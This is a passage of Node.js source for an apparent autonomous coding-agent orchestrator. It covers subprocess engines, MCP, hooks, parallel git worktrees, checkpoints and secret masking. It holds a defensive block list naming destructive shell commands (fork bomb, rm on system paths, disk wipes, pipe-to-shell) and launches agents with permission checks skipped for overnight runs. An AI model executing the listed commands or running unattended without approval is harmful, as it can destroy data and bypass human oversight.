          if (t == null) { result = { error: "cannot read " + a.path }; }
          else if (!t.includes(a.find)) { result = { error: "find text not present in file" }; }
          else if (!(await approve("edit " + a.path))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.path); }
          else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); changed.push({ path: fp, before: t, label: "edit " + a.path }); result = { ok: true }; console.log("  " + green("edit ") + a.path); }
        }
        else if (name === "run_command") {
          if (!(await approve("run: " + a.command))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.command); }
          else { console.log("  " + mag("$ ") + a.command); const r = await coderShell(a.command, cwd); result = { code: r.code, output: r.output }; if (r.output && !printMode) console.log(r.output.split("\n").slice(0, 20).map((l) => "    " + gray(l)).join("\n")); }
        }
        else { result = { error: "unknown tool '" + name + "' (use read_file/write_file/edit_file/list_dir/run_command)" }; }
      } catch (e) { result = { error: e.message }; }
      if (["read_file", "write_file", "edit_file", "list_dir", "run_command"].includes(name)) didTool = true;
      messages.push({ role: "tool", content: JSON.stringify(result).slice(0, 16000) });
      if (step === 40) console.log("  " + red("(step limit reached)"));
    }
    if (printMode) return;
  }
}

// ==================== Nexus autonomous orchestrator (multi-level planning, overnight) ====================
const _cp = require("child_process");
function hasBin(b) { try { const r = _cp.spawnSync(b, ["--version"], { timeout: 6000 }); return !r.error; } catch (_) { return false; } }

// Delegate a whole task to an external agent binary (claude / opencode). Streams output; returns {ok, output}.
function runEngineTask(engine, prompt, cwd, autonomous, cont, onChunk, ctl, model) {
  return new Promise((resolve) => {
    let cmd, args;
    if (engine === "claude") { cmd = "claude"; args = ["-p", prompt, "--output-format", "text"]; if (cont) args.push("--continue"); if (autonomous) args.push("--dangerously-skip-permissions"); if (model) args.push("--model", model); }
    else if (engine === "opencode") { cmd = "opencode"; args = ["run", prompt]; }
    else return resolve({ ok: false, output: "unknown engine: " + engine });
    let out = "";
    const p = _cp.spawn(cmd, args, { cwd, env: process.env });
    if (ctl && ctl.kids) ctl.kids.push(() => { try { p.kill("SIGINT"); } catch (_) {} setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 1200); }); // let ctrl+c kill this child
    try { p.stdin.end(); } catch (_) {} // signal EOF so the CLI doesn't wait on stdin
    p.stdout.on("data", (d) => { const s = d.toString(); out += s; if (onChunk) onChunk(s); else process.stdout.write(gray("    " + s.replace(/\n/g, "\n    "))); });
    p.stderr.on("data", (d) => (out += d.toString()));
    const to = setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 40 * 60 * 1000);
    p.on("close", (code) => { clearTimeout(to); resolve({ ok: code === 0, output: out.slice(-12000) }); });
    p.on("error", (e) => { clearTimeout(to); resolve({ ok: false, output: "engine spawn error: " + e.message + " (is '" + engine + "' installed & logged in?)" }); });
  });
}
// Claude Code stream-json driver — parses NDJSON events so the TUI can render
// tool cards, live token usage, cost and context size exactly like Claude Code.
function runClaudeStream(prompt, cwd, cont, h, ctl, opts) {
  opts = opts || {};
  return new Promise((resolve) => {
    const args = opts.readonly ? ["-p", prompt, "--output-format", "stream-json", "--verbose", "--permission-mode", "plan"] : ["-p", prompt, "--output-format", "stream-json", "--verbose", "--dangerously-skip-permissions"];
    if (cont) args.push("--continue");
    if (opts.model) args.push("--model", opts.model);
    const env = opts.small ? Object.assign({}, process.env, { ANTHROPIC_SMALL_FAST_MODEL: opts.small, CLAUDE_CODE_BG_CLASSIFIER_MODEL: opts.small }) : process.env;
    const cp = _cp.spawn("claude", args, { cwd, env });
    try { cp.stdin.end(); } catch (_) {} // signal EOF so claude doesn't wait on stdin
    let buf = "", finalText = "", res = null, killed = false;
    if (ctl) ctl.kill = () => { killed = true; try { cp.kill("SIGINT"); } catch (_) {} setTimeout(() => { try { cp.kill("SIGKILL"); } catch (_) {} }, 1500); };
    cp.stdout.on("data", (d) => {
      buf += d.toString();
      let nl;
      while ((nl = buf.indexOf("\n")) >= 0) {
        const line = buf.slice(0, nl); buf = buf.slice(nl + 1);
        if (!line.trim()) continue;
        let ev; try { ev = JSON.parse(line); } catch (_) { continue; }
        if (ev.type === "system" && ev.subtype === "init") { h.onInit && h.onInit(ev); }
        else if (ev.type === "rate_limit_event") { h.onRateLimit && h.onRateLimit(ev.rate_limit_info || {}); }
        else if (ev.type === "assistant" && ev.message) {
          for (const c of ev.message.content || []) {
            if (c.type === "text" && c.text) { finalText += c.text; h.onText && h.onText(c.text); }
            else if (c.type === "thinking" && c.thinking) { h.onThinking && h.onThinking(c.thinking); }
            else if (c.type === "tool_use") { h.onTool && h.onTool({ id: c.id, name: c.name, input: c.input || {} }); }
          }
          if (ev.message.usage) h.onUsage && h.onUsage(ev.message.usage, ev.message.model);
        }
        else if (ev.type === "user" && ev.message) {
          for (const c of ev.message.content || []) if (c.type === "tool_result") h.onToolResult && h.onToolResult({ id: c.tool_use_id, content: c.content, isError: c.is_error });
        }
        else if (ev.type === "result") { res = ev; if (ev.result && !finalText.trim()) finalText = ev.result; h.onResult && h.onResult(ev); }
      }
    });
    cp.stderr.on("data", () => {});
    const to = setTimeout(() => { try { cp.kill("SIGKILL"); } catch (_) {} }, 40 * 60 * 1000);
    cp.on("close", (code) => { clearTimeout(to); resolve({ ok: code === 0 && !killed, interrupted: killed, output: finalText, result: res }); });
    cp.on("error", (e) => { clearTimeout(to); resolve({ ok: false, output: "engine spawn error: " + e.message + " (is claude installed & logged in?)" }); });
  });
}
// Safe, non-destructive git checkpoint (captures tracked + untracked into a tree
// object using a temp index; never touches HEAD/index/history). /undo restores
// tracked file contents to the snapshot and never deletes anything.
function nexusCheckpoint(cwd) {
  try {
    const path = require("path"), fs = require("fs");
    _cp.execSync("git rev-parse --is-inside-work-tree", { cwd, stdio: "ignore" });
    const idx = path.join(cwd, ".nexus", "ckpt.index");
    fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true });
    try { fs.unlinkSync(idx); } catch (_) {}
    const env = Object.assign({}, process.env, { GIT_INDEX_FILE: idx });
    _cp.execSync("git add -A", { cwd, env, stdio: "ignore" });
    try { _cp.execSync("git rm -r --cached --ignore-unmatch --quiet .nexus", { cwd, env, stdio: "ignore" }); } catch (_) {} // never snapshot/restore Nexus's own state dir
    const tree = _cp.execSync("git write-tree", { cwd, env }).toString().trim();
    try { fs.unlinkSync(idx); } catch (_) {}
    return tree || null;
  } catch (_) { return null; }
}
// Restore a snapshot. If `paths` is given (repo-relative), restore ONLY those files
// (via a throwaway commit) so unrelated manual edits are never clobbered. Otherwise
// full-tree restore (fallback). Returns true on success.
function nexusRestore(cwd, tree, paths) {
  try {
    const path = require("path"), fs = require("fs");
    if (!paths || !paths.length) return true; // never full-clobber the tree — only restore files Nexus recorded changing
    const commit = _cp.execSync("git commit-tree " + tree + " -m nexus-restore", { cwd, encoding: "utf8" }).trim();
    const present = [], created = [];
    for (const p of paths) { try { _cp.execSync("git cat-file -e " + commit + ":./" + p.replace(/"/g, ""), { cwd, stdio: "ignore" }); present.push(p); } catch (_) { created.push(p); } }
    if (present.length) _cp.execSync("git checkout " + commit + " -- " + present.map((p) => JSON.stringify(p)).join(" "), { cwd, stdio: "ignore" });
    for (const p of created) { try { fs.rmSync(path.resolve(cwd, p), { force: true }); } catch (_) {} } // files the turn created → remove them on undo
    return true;
  } catch (_) { return false; }
}
// ---------- MCP (Model Context Protocol): minimal dependency-free JSON-RPC-2.0 stdio client ----------
function loadMcpConfig(cwd) {
  const fs = require("fs"), path = require("path");
  for (const f of [path.join(cwd, ".nexus", "mcp.json"), path.join(cwd, ".mcp.json")]) { try { const j = JSON.parse(fs.readFileSync(f, "utf8")); if (j && j.mcpServers && Object.keys(j.mcpServers).length) return j.mcpServers; } catch (_) {} }
  return null;
}
function mcpConnect(name, spec, cwd) {
  return new Promise((resolve) => {
    let cp; try { cp = _cp.spawn(spec.command, spec.args || [], { cwd, env: Object.assign({}, process.env, spec.env || {}), stdio: ["pipe", "pipe", "ignore"] }); } catch (e) { return resolve({ name, error: e.message }); }
    let buf = "", idc = 0; const pending = {};
    cp.stdout.on("data", (d) => { buf += d.toString(); let nl; while ((nl = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, nl); buf = buf.slice(nl + 1); if (!line.trim()) continue; let m; try { m = JSON.parse(line); } catch (_) { continue; } if (m.id != null && pending[m.id]) { pending[m.id](m); delete pending[m.id]; } } });
    cp.on("error", () => {});
    const call = (method, params) => new Promise((res, rej) => { const id = ++idc; pending[id] = (m) => m.error ? rej(new Error(m.error.message || "mcp error")) : res(m.result); try { cp.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params: params || {} }) + "\n"); } catch (e) { return rej(e); } setTimeout(() => { if (pending[id]) { delete pending[id]; rej(new Error("mcp timeout")); } }, 20000); });
    const notify = (method, params) => { try { cp.stdin.write(JSON.stringify({ jsonrpc: "2.0", method, params: params || {} }) + "\n"); } catch (_) {} };
    (async () => {
      try {
        await call("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "nexus", version: "1.0" } });
        notify("notifications/initialized", {});
        const tl = await call("tools/list", {});
        resolve({ name, cp, call, tools: (tl && tl.tools) || [] });
      } catch (e) { try { cp.kill(); } catch (_) {} resolve({ name, error: e.message }); }
    })();
  });
}
// ---------- Hooks: run project-defined shell commands around events (Claude-Code style) ----------
function loadHooks(cwd) { const fs = require("fs"), path = require("path"); try { return JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "hooks.json"), "utf8")); } catch (_) { return null; } }
function runHooks(hooks, event, env, cwd) {
  const list = (hooks && hooks[event]) || [];
  for (const h of list) {
    if (!h || !h.command) continue;
    try { if (h.matcher && env.TOOL_NAME && !(new RegExp(h.matcher).test(env.TOOL_NAME))) continue; } catch (_) { continue; } // bad matcher regex must not crash the turn
    try { const r = _cp.spawnSync(h.command, { shell: true, cwd, env: Object.assign({}, process.env, env), encoding: "utf8", timeout: (h.timeout || 15) * 1000 }); if (r.status && r.status !== 0) return { block: true, out: ((r.stdout || "") + (r.stderr || "")).trim().slice(0, 400) }; } catch (_) {} }
  return { block: false };
}
// build an AbortSignal wired to a ctl's kill list (so ctrl+c aborts in-flight ollama requests)
function ctlSignal(ctl) { if (!ctl || !ctl.kids) return undefined; const ac = new AbortController(); ctl.kids.push(() => { try { ac.abort(); } catch (_) {} }); return ac.signal; }
// ---------- Parallel sub-agents: fan a list of independent tasks out across the current engine ----------
async function runSubagents(engine, tasks, cwd, model, onProgress, ctl, pickModel) {
  const path = require("path"), fs = require("fs"), os = require("os");
  const results = new Array(tasks.length);
  // Isolate each concurrent agent in its own git worktree so parallel writers can't
  // corrupt each other; merge their changes back sequentially at the end.
  let baseCommit = null, isGit = false;
  try { _cp.execSync("git rev-parse --is-inside-work-tree", { cwd, stdio: "ignore" }); isGit = true; } catch (_) {}
  if (isGit) { try { const tree = nexusCheckpoint(cwd); if (tree) baseCommit = _cp.execSync("git commit-tree " + tree + " -m nexus-agents-base", { cwd, encoding: "utf8" }).trim(); } catch (_) {} }
  const useWt = !!(isGit && baseCommit);
  const worktrees = new Array(tasks.length).fill(null);
  const stamp = Date.now().toString(36);
  const removeWt = (wt) => { try { _cp.execSync("git worktree remove --force " + JSON.stringify(wt), { cwd, stdio: "ignore" }); } catch (_) { try { fs.rmSync(wt, { recursive: true, force: true }); } catch (__) {} } };
  const runOne = async (i) => {
    if (ctl && ctl.stopped) { results[i] = "(interrupted)"; if (onProgress) onProgress(i, "done"); return; }
    if (onProgress) onProgress(i, "run");
    let dir = cwd;
    if (useWt) { const wt = path.join(os.tmpdir(), "nexus-agent-" + stamp + "-" + i); try { _cp.execSync("git worktree add --detach " + JSON.stringify(wt) + " " + baseCommit, { cwd, stdio: "ignore" }); worktrees[i] = dir = wt; } catch (_) { dir = cwd; } }
    let out;
    try { if (engine === "ollama") { const r = await ollamaExec(model, tasks[i], "", dir, ctlSignal(ctl)); out = (r.output || "").trim(); } else { const r = await runEngineTask(engine, tasks[i], dir, true, false, null, ctl, pickModel ? pickModel(tasks[i]) : undefined); out = (r.output || "").trim(); } }
    catch (e) { out = "error: " + e.message; }
    results[i] = out; if (onProgress) onProgress(i, "done");
  };
  // With isolation, agents run concurrently; without it (no git, or ollama), serialize to avoid corrupting the shared dir.
  const conc = useWt ? Math.max(1, Math.min(4, tasks.length)) : 1;
  let idx = 0; async function worker() { while (idx < tasks.length) { await runOne(idx++); } }
  try { await Promise.all(Array.from({ length: conc }, worker)); }
  finally {
    if (useWt) {
      const claimed = new Map(), conflicts = [];
      for (let i = 0; i < tasks.length; i++) { const wt = worktrees[i]; if (!wt) continue;
        try { const status = _cp.execSync("git -C " + JSON.stringify(wt) + " status --porcelain -uall", { encoding: "utf8" });
          for (const line of status.split("\n")) { if (!line.trim()) continue; const st = line.slice(0, 2); let p = line.slice(3); if (p.includes(" -> ")) { const old = p.split(" -> ")[0].replace(/^"|"$/g, ""); try { fs.rmSync(path.join(cwd, old), { force: true }); } catch (_) {} p = p.split(" -> ")[1]; } p = p.replace(/^"|"$/g, "");
            if (claimed.has(p)) { conflicts.push(p); continue; }
            claimed.set(p, i); const src = path.join(wt, p), dst = path.join(cwd, p);
            try { if (/D/.test(st) && !fs.existsSync(src)) fs.rmSync(dst, { force: true }); else if (fs.existsSync(src)) { fs.mkdirSync(path.dirname(dst), { recursive: true }); fs.copyFileSync(src, dst); } } catch (_) {}
          }
        } catch (_) {}
      }
      for (const wt of worktrees) if (wt) removeWt(wt);
      if (conflicts.length) { const u = [...new Set(conflicts)]; const note = "\n\n[merge: " + u.length + " file(s) were edited by more than one agent — kept the first writer, skipped the rest: " + u.slice(0, 8).join(", ") + "]"; const last = results.length - 1; results[last] = (results[last] || "") + note; }
    }
  }
  return results;
}
// Secret scanner — flags common leaked credentials in text/files (Nexus is a security tool).
function scanSecrets(text) {
  const s = String(text || ""), pats = [
    [/\bAKIA[0-9A-Z]{16}\b/, "AWS access key id"],
    [/-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/, "private key"],
    [/\bgh[pousr]_[A-Za-z0-9]{30,}\b/, "GitHub token"],
    [/\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, "Slack token"],
    [/\bsk-[A-Za-z0-9]{20,}\b/, "OpenAI-style API key"],
    [/\bAIza[0-9A-Za-z_-]{35}\b/, "Google API key"],
    [/\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}\b/, "JWT"],
    [/(?:password|passwd|secret|api[_-]?key|access[_-]?token)\s*[:=]\s*['"][^'"\s]{6,}['"]/i, "hardcoded credential"],
  ];
  const hits = []; for (const [re, name] of pats) if (re.test(s)) hits.push(name);
  return [...new Set(hits)];
}
// Extended device tools for the local agent: content search, file find, HTTP fetch,
// system info, process list, and filesystem management. Returns a result object,
// or null if `name` isn't a device tool (so the caller can fall through).
async function deviceTool(name, a, cwd) {
  const fs = require("fs"), path = require("path"), os = require("os");
  const rp = (p) => { const r = path.resolve(cwd, p == null ? "." : p); if (r !== cwd && !r.startsWith(cwd + path.sep)) throw new Error("path escapes the project directory: " + p); return r; }; // sandbox all device-tool file ops to cwd
  const SKIP = /(^|\/)(\.git|node_modules|dist|build|\.nexus|\.cache)(\/|$)/;
  if (name === "search" || name === "grep") {
    const pat = a.pattern || a.query || a.q; if (!pat) return { error: "search needs a pattern" };
    let re; try { re = new RegExp(pat, "i"); } catch (_) { re = new RegExp(String(pat).replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"); }
    const out = []; const walk = (d) => { if (out.length >= 100) return; let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else { let txt; try { if (fs.statSync(fp).size > 500000) continue; txt = fs.readFileSync(fp, "utf8"); } catch (_) { continue; } const lines = txt.split("\n"); for (let i = 0; i < lines.length && out.length < 100; i++) if (re.test(lines[i])) out.push(path.relative(cwd, fp) + ":" + (i + 1) + ": " + lines[i].trim().slice(0, 160)); } if (out.length >= 100) return; } };
    walk(rp(a.path || ".")); return { matches: out, truncated: out.length >= 100 };
  }
  if (name === "find" || name === "find_files" || name === "glob") {
    const q = String(a.glob || a.pattern || a.name || "").toLowerCase(); const out = [];
    const walk = (d) => { if (out.length >= 300) return; let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else if (!q || e.name.toLowerCase().includes(q)) { out.push(path.relative(cwd, fp)); if (out.length >= 300) return; } } };
    walk(rp(a.path || ".")); return { files: out };
  }
  if (name === "http_fetch" || name === "web_fetch" || name === "fetch_url" || name === "http") {
    const url = a.url; if (!url) return { error: "http_fetch needs a url" };
    return await new Promise((resolve) => { try { const lib = String(url).startsWith("https") ? require("https") : require("http"); const req = lib.request(url, { method: a.method || "GET", headers: a.headers || {}, timeout: 15000 }, (res) => { let d = ""; res.on("data", (c) => { if (d.length < 200000) d += c; }); res.on("end", () => resolve({ status: res.statusCode, contentType: res.headers["content-type"], body: d.slice(0, 20000) })); }); req.on("timeout", () => { req.destroy(); resolve({ error: "timeout" }); }); req.on("error", (e) => resolve({ error: e.message })); if (a.body != null) req.write(typeof a.body === "string" ? a.body : JSON.stringify(a.body)); req.end(); } catch (e) { resolve({ error: e.message }); } });
  }
  if (name === "sysinfo" || name === "system_info") {
    let disk = ""; try { disk = _cp.execSync("df -h " + JSON.stringify(cwd) + " 2>/dev/null", { encoding: "utf8" }).trim().split("\n").slice(-1)[0]; } catch (_) {}
    const c = os.cpus()[0] || {};
    return { platform: os.platform(), arch: os.arch(), release: os.release(), hostname: os.hostname(), cpus: os.cpus().length + " x " + (c.model || "?"), memory: (os.totalmem() / 1e9).toFixed(1) + "GB total, " + (os.freemem() / 1e9).toFixed(1) + "GB free", loadavg: os.loadavg().map((n) => n.toFixed(2)).join(" "), uptime: (os.uptime() / 3600).toFixed(1) + "h", cwd, node: process.version, disk };
  }
  if (name === "list_processes" || name === "ps") {
    try { const r = _cp.execSync(process.platform === "win32" ? "tasklist" : "ps aux", { encoding: "utf8", maxBuffer: 4e6 }); let lines = r.split("\n"); if (a.filter) lines = [lines[0]].concat(lines.slice(1).filter((l) => l.toLowerCase().includes(String(a.filter).toLowerCase()))); return { processes: lines.slice(0, 60).join("\n") }; } catch (e) { return { error: e.message }; }
  }
  if (name === "make_dir" || name === "mkdir") { try { fs.mkdirSync(rp(a.path), { recursive: true }); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "move" || name === "rename" || name === "move_file") { try { fs.renameSync(rp(a.from || a.src), rp(a.to || a.dest)); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "copy" || name === "copy_file") { try { fs.copyFileSync(rp(a.from || a.src), rp(a.to || a.dest)); return { ok: true }; } catch (e) { return { error: e.message }; } }
  if (name === "delete" || name === "delete_file" || name === "rm") { try { fs.rmSync(rp(a.path), { recursive: !!a.recursive, force: true }); return { ok: true }; } catch (e) { return { error: e.message }; } }
  return null;
}
// ---------- cost-aware model tiering for /cowork ----------
// Rough Claude price table ($ per 1M tokens: input, output). Used only to ESTIMATE
// whether delegating a task to a cheaper model saves more than the delegation overhead.
const MODEL_PRICE = [[/opus/i, { in: 15, out: 75 }], [/sonnet/i, { in: 3, out: 15 }], [/haiku/i, { in: 0.8, out: 4 }], [/fable/i, { in: 1, out: 5 }]];
function priceOf(m) { for (const [re, p] of MODEL_PRICE) if (re.test(String(m || ""))) return p; return { in: 3, out: 15 }; }
// Is a task "mechanical" (cheap — safe to run on the weak model)?
function isMechanical(text) { return /\b(run|running|execute|exec|test|tests|lint|format|prettier|build|compile|install|npm|yarn|pnpm|pip|cargo|go build|make|rename|move|copy|delete|remove|mkdir|list|find|search|grep|read|show|print|cat|commit|status|diff|log|clean|typecheck|type-check|check|verify)\b/i.test(String(text || "")) && !/\b(implement|refactor|design|architect|debug|fix the bug|write the|create the|algorithm|optimi[sz]e|redesign|rewrite)\b/i.test(String(text || "")); }
// Estimate whether delegating (est output/input tokens) to `weak` beats the fixed overhead of re-sending context.
function shouldDelegate(estOutTok, estInTok, strong, weak) {
  if (!weak || !strong || weak === strong) return false;
  const sp = priceOf(strong), wp = priceOf(weak);
  if (wp.out >= sp.out) return false; // weak isn't actually cheaper
  const saved = (estOutTok / 1e6) * (sp.out - wp.out) + (estInTok / 1e6) * (sp.in - wp.in);
  const overhead = (2000 / 1e6) * (sp.in + wp.in); // extra context round-trip both ways
  return saved > overhead;
}
// Sentinel preflight — classify a shell command's destructive intent (inspired by Glitch's
// Sentinel, improved: names the matched rule, covers pipe-to-shell + fork bombs, 3 levels).
function classifyDanger(cmd) {
  const c = String(cmd || "");
  const block = [
    [/:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, "fork bomb"],
    [/\brm\s+(-\S*\s+)*(\/(\s|$)|\/\*|~(\/|\s|$)|\$HOME\b|\/(etc|usr|var|boot|bin|lib|sys|dev|opt|root)\b)/i, "rm on a system/home path"],
    [/\bmkfs(\.\w+)?\b|\bdd\b[^\n]*\bof=\/dev\/|\b(wipefs|shred)\b|>\s*\/dev\/(sd|nvme|hd|mmcblk)/i, "writes/formats a raw disk"],
    [/\bgit\s+reset\s+--hard\b/i, "git reset --hard discards uncommitted work"],
    [/\bgit\s+push\b[^\n]*(--force(-with-lease)?\b|\s-f\b)/i, "git force-push"],
    [/\bgit\s+clean\s+-\S*f\S*d|\bgit\s+clean\s+-\S*d\S*f/i, "git clean -fd deletes untracked files"],
    [/\bchmod\s+-R\s+0*777\s+\//i, "chmod -R 777 on a root path"],
    [/\b(curl|wget|fetch)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python\d?)\b/i, "pipe-to-shell of a downloaded script"],
    [/\b(shutdown|reboot|halt|poweroff)\b|\binit\s+0\b/i, "powers off / reboots the machine"],
    [/\bDROP\s+(TABLE|DATABASE)\b|\bTRUNCATE\s+TABLE\b/i, "destructive SQL (DROP/TRUNCATE)"],
  ];
  for (const [re, why] of block) if (re.test(c)) return { level: "block", why };
  const warn = [
    [/(^|\s)sudo\s/i, "runs as root (sudo)"],
    [/\bgit\s+checkout\s+(--\s|\.\s*$|\.\s)/i, "git checkout discards local changes"],
    [/\brm\s+-\S*r\S*f|\brm\s+-\S*f\S*r|\brm\s+-\S*r\b/i, "recursive (force) delete"],
    [/\b(killall|pkill)\b/i, "kills processes by name"],
    [/\bnpm\s+publish\b|\bgit\s+push\b/i, "publishes / pushes"],
  ];
  for (const [re, why] of warn) if (re.test(c)) return { level: "warn", why };
  return { level: "ok" };
}
// Mask secrets before text is sent to a cloud engine (privacy layer).
function maskSecrets(text) {
  return String(text)
    .replace(/-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, "[redacted:private-key]")
    .replace(/\bAKIA[0-9A-Z]{16}\b/g, "[redacted:aws-key]")
    .replace(/\bgh[pousr]_[A-Za-z0-9]{30,}\b/g, "[redacted:github-token]")
    .replace(/\bxox[baprs]-[A-Za-z0-9-]{10,}\b/g, "[redacted:slack-token]")
    .replace(/\bsk-[A-Za-z0-9]{20,}\b/g, "[redacted:api-key]")
    .replace(/\bAIza[0-9A-Za-z_-]{35}\b/g, "[redacted:google-key]")
    .replace(/\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}\b/g, "[redacted:jwt]");
}
function extractJson(text, fallback) {
  const s = String(text || ""); const arr = s.match(/\[[\s\S]*\]/), obj = s.match(/\{[\s\S]*\}/);
  for (const m of [arr, obj]) if (m) { try { return JSON.parse(m[0]); } catch (_) {} }
  return fallback;
}
async function planGoal(engine, model, goal, memory) {
  const prompt = "You are a senior engineer planning autonomous work. Break the GOAL into an ordered list of concrete, independently-verifiable tasks (about 5-15). Return ONLY a JSON array of short task strings — no prose, no markdown.\n\nGOAL: " + goal + (memory ? "\n\nPROJECT MEMORY:\n" + memory : "");
  let text;
  if (engine === "ollama") text = await ollamaChat(model, [{ role: "user", content: prompt }], { type: "array", items: { type: "string" } });
  else text = (await runEngineTask(engine, prompt, process.cwd(), false)).output;
  let tasks = extractJson(text, null);
  if (!Array.isArray(tasks) || !tasks.length) tasks = [goal];
  return tasks.slice(0, 40).map((t, i) => ({ id: i + 1, title: String(t).slice(0, 300), done: false, failed: false, tries: 0 }));
}
async function verifyTask(engine, model, goal, task, res) {
  if (engine !== "ollama") { const refused = /\b(could ?n['’]?t|could not|unable to|failed to complete|can['’]?t complete|cannot complete|was not able to|were unable to|i (?:can['’]?t|cannot))\b/i.test((res.output || "").slice(-1200)); return { done: res.ok && !refused, reason: !res.ok ? "agent exited non-zero" : (refused ? "agent reported it could not complete the task" : "completed") }; }
  const prompt = "Given the GOAL, a TASK, and the AGENT OUTPUT, decide if the task is genuinely complete. Return ONLY JSON {\"done\":true|false,\"reason\":\"...\"}.\nGOAL: " + goal + "\nTASK: " + task + "\nOUTPUT (truncated):\n" + String(res.output || "").slice(-2500);
  const v = extractJson(await ollamaChat(model, [{ role: "user", content: prompt }], { type: "object", properties: { done: { type: "boolean" }, reason: { type: "string" } }, required: ["done"] }), null);
  return (v && typeof v.done === "boolean") ? { done: v.done, reason: v.reason || "" } : { done: true, reason: "unverifiable" };
}
// Compact single-task tool loop for the local Ollama engine.
async function ollamaExec(model, task, ctx, cwd, signal) {
  const fs = require("fs"), path = require("path");
  const messages = [{ role: "system", content: "You are Nexus, an autonomous coding agent. Complete ONLY the given TASK in the working directory using tools, ONE action per step, then action:'final'. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace}, list_dir{path?}, run_command{command}. Reply with ONE JSON object per the schema.\n" + ctx }, { role: "user", content: "TASK: " + task }];
  let didTool = false, log = "";
  for (let step = 1; step <= 30; step++) {
    if (signal && signal.aborted) return { ok: false, output: log + "\n(interrupted)" };
    let raw; try { raw = await ollamaChat(model, messages, CODER_SCHEMA, signal); } catch (e) { return { ok: signal && signal.aborted ? false : false, output: (signal && signal.aborted) ? log + "\n(interrupted)" : "model error: " + e.message }; }
    let o; try { o = JSON.parse(raw); } catch (_) { messages.push({ role: "tool", content: "Reply with valid schema JSON." }); continue; }
    messages.push({ role: "assistant", content: raw });
    if (o.thought) console.log("    " + gray(o.thought));
    if (o.action === "final") { if (!didTool && step < 3) { messages.push({ role: "tool", content: "Do the real work first." }); continue; } return { ok: true, output: log + "\n" + (o.final || "") }; }
    const name = o.tool, a = o.args || {}; let result;
    try {
      if (name === "read_file") result = { content: fs.readFileSync(path.resolve(cwd, a.path), "utf8").slice(0, 14000) };
      else if (name === "list_dir") result = { items: fs.readdirSync(path.resolve(cwd, a.path || "."), { withFileTypes: true }).map((e) => e.isDirectory() ? e.name + "/" : e.name).slice(0, 200) };
      else if (name === "write_file") { const fp = path.resolve(cwd, a.path); fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); result = { ok: true }; log += "\nwrote " + a.path; console.log("    " + green("write ") + a.path); }
      else if (name === "edit_file") { const fp = path.resolve(cwd, a.path); const t = fs.readFileSync(fp, "utf8"); if (!t.includes(a.find)) result = { error: "find not present" }; else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); result = { ok: true }; log += "\nedited " + a.path; console.log("    " + green("edit ") + a.path); } }
      else if (name === "run_command") { const dg = classifyDanger(a.command); if (dg.level === "block") { result = { error: "blocked by Sentinel (destructive: " + dg.why + ")" }; console.log("    " + red("blocked ") + dg.why); } else { console.log("    " + mag("$ ") + a.command); const r = await coderShell(a.command, cwd); result = { code: r.code, output: r.output }; log += "\n$ " + a.command + "\n" + r.output.slice(0, 1200); } }
      else { const dr = await deviceTool(name, a, cwd); result = dr !== null ? dr : { error: "unknown tool " + name }; }
    } catch (e) { result = { error: e.message }; }
    if (!(result && typeof result.error === "string" && result.error.startsWith("unknown tool"))) didTool = true;
    messages.push({ role: "tool", content: JSON.stringify(result).slice(0, 14000) });
  }
  return { ok: true, output: log + "\n(step limit)" };
}
function parseUntil(s) {
  const now = new Date(); let m;
  if ((m = /^(\d{1,2}):(\d{2})$/.exec(s))) { const d = new Date(now); d.setHours(+m[1], +m[2], 0, 0); if (d <= now) d.setDate(d.getDate() + 1); return d.getTime(); }
  if ((m = /^(\d+)h$/.exec(s))) return now.getTime() + (+m[1]) * 3600000;
  if ((m = /^(\d+)m$/.exec(s))) return now.getTime() + (+m[1]) * 60000;
  return 0;
}
function nexusRunHelp() {
  banner(); console.log("  " + bold("Nexus run") + " — autonomous, multi-level goal execution\n");
  console.log("  " + bold("USAGE") + "\n    sentinel nexus run \"<goal>\" [options]\n    sentinel nexus overnight \"<goal>\"   (alias for run --overnight)\n");
  console.log("  " + bold("OPTIONS"));
  console.log("    -e, --engine <name>   claude (default) | hybrid (local does the easy work, Claude the hard — cheapest) | ollama | opencode");
  console.log("    -n, --overnight       keep working the plan with retries until done or --until");
  console.log("        --until <t>       stop at HH:MM, or after 6h / 90m");
  console.log("        --resume          continue the last run in this folder (.nexus/run.json)");
  console.log("    -m, --model <name>    ollama model (ollama engine only)");
  console.log("\n  " + gray("Plan, progress and report live in ./.nexus/ (run.json, report.md, memory.md).") + "\n  " + gray("claude/opencode run with full autonomy (--dangerously-skip-permissions) — use in a trusted repo.") + "\n");
}
// `nexus agents "task1" "task2" …` — run independent tasks in parallel across the current engine.
async function nexusAgents(argv) {
